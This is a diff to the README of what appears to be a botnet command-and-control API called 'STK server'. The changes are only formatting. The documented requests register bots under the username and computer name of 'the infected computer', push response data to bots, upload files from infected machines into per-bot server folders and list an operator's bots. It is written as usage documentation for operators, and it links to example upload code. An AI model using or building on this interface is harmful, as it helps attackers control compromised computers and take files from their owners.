@@ -52,14 +52,15 @@
 > Warning! You need set you username and token in request
 > You can get you token in Remote Access Terminal. Just execute command 'token'
 
-`host`         This is ip of STK server
-`username`     This is you account username on STK server.
-`token`        This is you account token    on STK server.
-`bot_uuid`     This is randomly generated uuid
+
+`host`         This is ip of STK server  
+`username`     This is you account username on STK server.  
+`token`        This is you account token    on STK server.  
+`bot_uuid`     This is randomly generated uuid  
 
 ###### CREATE BOT:
-`bot_username`     This is the username of the bot on the infected computer.
-`bot_computername` This is the computername of the bot on the infected computer.
+`bot_username`     This is the username of the bot on the infected computer.  
+`bot_computername` This is the computername of the bot on the infected computer.  
 
 **GET REQUEST:** _httр://host/api.php?profile=username&token=token&bot_uuid=bot_uuid&bot_username=bot_username&bot_computername=bot_computername&create_user_
 ```json
@@ -133,9 +134,9 @@
 ```
 
 ###### ADD LOCAL RESPONSE DATA TO BOT:
->  If you repeat it, the old line will not be overwritten.
-> `response` This is a data line. Which is stored on the server.
-> `type`     May be 'local'. Data string will be stored on your bot.
+>  If you repeat it, the old line will not be overwritten.  
+> `response` This is a data line. Which is stored on the server.  
+> `type`     May be 'local'. Data string will be stored on your bot.  
 
 **GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&response=Here is response data to bot&type=local_
 ```json
@@ -147,9 +148,9 @@
 
 ```
 ###### ADD GLOBAL RESPONSE DATA TO STK USER:
->  If you repeat it, the old line will not be overwritten.
-> `response` This is a data line. Which is stored on the server.
-> `type`     If 'global'. Data string will be stored on your account.
+>  If you repeat it, the old line will not be overwritten.  
+> `response` This is a data line. Which is stored on the server.  
+> `type`     If 'global'. Data string will be stored on your account.  
 
 **GET REQUEST:** _httр://host/api.php?profile=profile&token=token&response=Here is response data to bot&type=global_
 ```json
@@ -187,8 +188,8 @@
 ```
 
 ###### UPLOAD FILE TO USER FOLDER:
->  Example python code to upload file: https://pastebin.com/0gteFain
->  File will be saved in folder: /users/`profile`/`bot_uuid`/file.txt
+>  Example python code to upload file: https://pastebin.com/0gteFain  
+>  File will be saved in folder: /users/`profile`/`bot_uuid`/file.txt  
  
 **POST REQUEST WITH FILE:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&upload_
 ```json
@@ -268,7 +269,7 @@
 ```
 
 ###### GET MY BOTS:
-> `login_password` It a password from account
+> `login_password` It a password from account  
 
 **GET REQUEST:** _httр://host/api.php?profile=profile&token=token&login_password=password&get_my_users_
 ```json
